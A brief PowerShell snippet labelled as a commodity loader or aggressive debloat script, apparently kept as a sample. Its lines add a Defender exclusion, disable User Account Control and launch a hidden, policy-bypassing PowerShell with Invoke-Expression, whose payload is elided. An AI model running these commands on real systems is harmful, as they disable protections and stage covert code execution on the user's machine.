# Unrelated commodity loader / aggressive debloat script
Add-MpPreference -ExclusionPath "C:\ProgramData\App"
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" EnableLUA 0
Start-Process powershell -ArgumentList "-w hidden -ep bypass -c IEX(...)"
